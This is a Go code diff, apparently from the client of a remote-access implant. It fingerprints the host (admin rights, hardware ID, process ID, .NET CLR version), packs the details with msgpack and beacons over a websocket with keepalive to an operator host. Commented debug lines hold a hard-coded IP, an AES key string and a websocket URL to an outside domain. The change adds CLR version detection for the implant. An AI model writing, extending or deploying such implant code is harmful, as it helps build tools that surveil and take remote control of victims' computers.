@@ -43,7 +43,7 @@ func SendInfo() []byte {
 	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
 	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
 	msgpack.ForcePathObject("Admin").SetAsString(PcInfo.IsAdmin())
-	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
+	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
 	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
 	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
 	//println(string(msgpack.Encode2Bytes()))
@@ -109,7 +109,6 @@ func (c *Client) Connect(url string) {
 		HandlePacket.Read(data, c.Connection)
 	})
 
-	// 开始连接
 	go c.Connection.Connect()
 	c.keepAlive = time.NewTicker(5 * time.Second)
 
@@ -139,17 +138,19 @@ func run_main(Host string) {
 	client := &Client{}
 	client.Connect(Host)
 }
-func checkDotNetFramework40() bool {
+func getClrVersion() string {
 	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`, registry.QUERY_VALUE)
 	if err != nil {
-		return false
+		return "v2.0" // If the registry cannot be accessed, assume CLR 2.0 is returned
 	}
 	defer key.Close()
-	release, _, err := key.GetIntegerValue("Release")
-	if err != nil {
-		return false
+
+	// If the Release key is present, CLR 4.0 or higher is installed
+	if _, _, err := key.GetIntegerValue("Release"); err == nil {
+		return "v4.0"
 	}
-	return release >= 378389
+
+	return "v2.0"
 }
 
 // var host = "192.168.8.123" // assuming for the sake of example
@@ -167,13 +168,15 @@ func main() {
 	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
 	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
 	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
-	PcInfo.IsDotNetFour = checkDotNetFramework40()
+	PcInfo.ProcessID = PcInfo.GetProcessID()
+	PcInfo.HWID = PcInfo.GetHWID()
+	PcInfo.ClrVersion = getClrVersion()
 
 	///Debug
-	// Host := "192.168.1.7"
+	// Host := "192.168.1.4"
 	// Port := "4000"
 	// PcInfo.ListenerName = "asd"
-
+	// PcInfo.AesKey = "QWERt_CSDMAHUATW"
 	// route := "www"
 	// // //url := "ws://www.sftech.shop:443//www"
 	url := "ws://" + Host + ":" + Port + "/" + route
